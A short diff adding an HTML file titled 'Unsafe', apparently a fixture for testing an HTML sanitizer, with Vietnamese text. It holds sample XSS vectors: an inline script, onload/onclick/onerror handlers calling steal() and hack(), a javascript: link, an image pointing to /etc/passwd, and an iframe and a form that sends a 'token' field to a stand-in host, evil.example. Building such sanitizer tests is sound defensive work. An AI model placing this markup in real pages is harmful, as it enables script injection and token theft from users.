@@ -1,0 +1,8 @@
+<!doctype html><html><head><title>Unsafe</title><script>window.evil=1</script></head><body onload="steal()">
+<h1 onclick="hack()">Tài liệu</h1>
+<p><a href="javascript:alert(1)">Không an toàn</a></p>
+<img src="file:///etc/passwd" onerror="hack()">
+<iframe src="https://evil.example/embed"></iframe>
+<iframe src="https://www.youtube.com/embed/demo"></iframe>
+<form action="https://evil.example"><input name="token"></form>
+</body></html>
